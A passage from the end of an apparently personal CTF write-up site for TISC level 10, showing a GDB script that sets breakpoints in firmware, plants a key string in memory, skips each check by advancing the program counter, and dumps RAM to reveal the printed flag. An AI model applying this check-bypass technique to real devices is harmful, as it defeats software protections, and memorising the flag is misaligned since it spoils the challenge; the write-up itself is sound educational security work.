</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12"></a>b *($pc+0x2066)
</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13"></a>
</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14"></a># Breakpoint 6: right before input #
</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15"></a>b *($pc+0x206E)
</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16"></a>
</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17"></a># Breakpoint 7: first group of check -&gt; [if RS25R24 != 0 @ code:1051]
</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18"></a>b *($pc+0x20A2)
</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19"></a>
</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20"></a># Breakpoint 8, 9: second group of checks -&gt; [if R25R24 == 0 and DAT_mem_037C != 0]
</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21"></a>b *($pc+0x20BA)
</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22"></a>b *($pc+0x20C4)
</span><span id="__span-11-23"><a id="__codelineno-11-23" name="__codelineno-11-23"></a>
</span><span id="__span-11-24"><a id="__codelineno-11-24" name="__codelineno-11-24"></a># Breakpoint 10: Bomb defused
</span><span id="__span-11-25"><a id="__codelineno-11-25" name="__codelineno-11-25"></a>b *($pc+0x26DA)
</span><span id="__span-11-26"><a id="__codelineno-11-26" name="__codelineno-11-26"></a>
</span><span id="__span-11-27"><a id="__codelineno-11-27" name="__codelineno-11-27"></a># Goto breakpoint 1, set key chip
</span><span id="__span-11-28"><a id="__codelineno-11-28" name="__codelineno-11-28"></a>c
</span><span id="__span-11-29"><a id="__codelineno-11-29" name="__codelineno-11-29"></a>set {char[17]}0x33d  = &quot;m59F$6/lHI^wR~C6&quot;
</span><span id="__span-11-30"><a id="__codelineno-11-30" name="__codelineno-11-30"></a># Goto breakpoint 2, bypass execution
</span><span id="__span-11-31"><a id="__codelineno-11-31" name="__codelineno-11-31"></a>c
</span><span id="__span-11-32"><a id="__codelineno-11-32" name="__codelineno-11-32"></a>set $pc = $pc + 2
</span><span id="__span-11-33"><a id="__codelineno-11-33" name="__codelineno-11-33"></a># Goto breakpoint 3, bypass execution
</span><span id="__span-11-34"><a id="__codelineno-11-34" name="__codelineno-11-34"></a>c
</span><span id="__span-11-35"><a id="__codelineno-11-35" name="__codelineno-11-35"></a>set $pc = $pc + 2
</span><span id="__span-11-36"><a id="__codelineno-11-36" name="__codelineno-11-36"></a># Goto breakpoint 4, bypass execution
</span><span id="__span-11-37"><a id="__codelineno-11-37" name="__codelineno-11-37"></a>c
</span><span id="__span-11-38"><a id="__codelineno-11-38" name="__codelineno-11-38"></a>set $pc = $pc + 2
</span><span id="__span-11-39"><a id="__codelineno-11-39" name="__codelineno-11-39"></a># Goto breakpoint 5, bypass execution
</span><span id="__span-11-40"><a id="__codelineno-11-40" name="__codelineno-11-40"></a>c
</span><span id="__span-11-41"><a id="__codelineno-11-41" name="__codelineno-11-41"></a>set $pc = $pc + 2
</span><span id="__span-11-42"><a id="__codelineno-11-42" name="__codelineno-11-42"></a># Goto breakpoint 6, bypass execution
</span><span id="__span-11-43"><a id="__codelineno-11-43" name="__codelineno-11-43"></a>c
</span><span id="__span-11-44"><a id="__codelineno-11-44" name="__codelineno-11-44"></a>set $pc = $pc + 2
</span><span id="__span-11-45"><a id="__codelineno-11-45" name="__codelineno-11-45"></a># Goto breakpoint 7, bypass execution
</span><span id="__span-11-46"><a id="__codelineno-11-46" name="__codelineno-11-46"></a>c
</span><span id="__span-11-47"><a id="__codelineno-11-47" name="__codelineno-11-47"></a>set $pc = $pc + 2
</span><span id="__span-11-48"><a id="__codelineno-11-48" name="__codelineno-11-48"></a># Goto breakpoint 8, bypass execution
</span><span id="__span-11-49"><a id="__codelineno-11-49" name="__codelineno-11-49"></a>c
</span><span id="__span-11-50"><a id="__codelineno-11-50" name="__codelineno-11-50"></a>set $pc = $pc + 2
</span><span id="__span-11-51"><a id="__codelineno-11-51" name="__codelineno-11-51"></a># Goto breakpoint 9, bypass execution
</span><span id="__span-11-52"><a id="__codelineno-11-52" name="__codelineno-11-52"></a>c
</span><span id="__span-11-53"><a id="__codelineno-11-53" name="__codelineno-11-53"></a>set $pc = $pc + 2
</span><span id="__span-11-54"><a id="__codelineno-11-54" name="__codelineno-11-54"></a># Goto breakpoint 10, display RAM and look for flag
</span><span id="__span-11-55"><a id="__codelineno-11-55" name="__codelineno-11-55"></a>c
</span><span id="__span-11-56"><a id="__codelineno-11-56" name="__codelineno-11-56"></a>x/1500s 0x800000
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../assets/level-10-flag.png" /></p>
<p>The flag is <code>TISC{h3y_Lo0k_1_m4d3_My_0wn_h4rdw4r3_t0k3n!}</code>.</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://discordapp.com/users/deyixtan" target="_blank" rel="noopener" title="discordapp.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485 485 0 0 0 404.081 32.03a1.82 1.82 0 0 0-1.923.91 338 338 0 0 0-14.9 30.6 447.9 447.9 0 0 0-134.426 0 310 310 0 0 0-15.135-30.6 1.89 1.89 0 0 0-1.924-.91 483.7 483.7 0 0 0-119.688 37.107 1.7 1.7 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.02 2.02 0 0 0 .765 1.375 487.7 487.7 0 0 0 146.825 74.189 1.9 1.9 0 0 0 2.063-.676A348 348 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588 321 321 0 0 1-45.868-21.853 1.885 1.885 0 0 1-.185-3.126 251 251 0 0 0 9.109-7.137 1.82 1.82 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.81 1.81 0 0 1 1.924.233 235 235 0 0 0 9.132 7.16 1.884 1.884 0 0 1-.162 3.126 301.4 301.4 0 0 1-45.89 21.83 1.875 1.875 0 0 0-1 2.611 391 391 0 0 0 30.014 48.815 1.86 1.86 0 0 0 2.063.7A486 486 0 0 0 610.7 405.729a1.88 1.88 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541M222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239 0 32.654-23.41 59.241-52.843 59.241m195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239 0 32.654-23.177 59.241-52.844 59.241"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://github.com/deyixtan" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "navigation.instant", "navigation.instant.progress", "navigation.path", "navigation.prune", "navigation.sections", "navigation.top", "search.highlight", "search.share", "search.suggest"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.525ec568.min.js"></script>
      
    
  </body>
</html>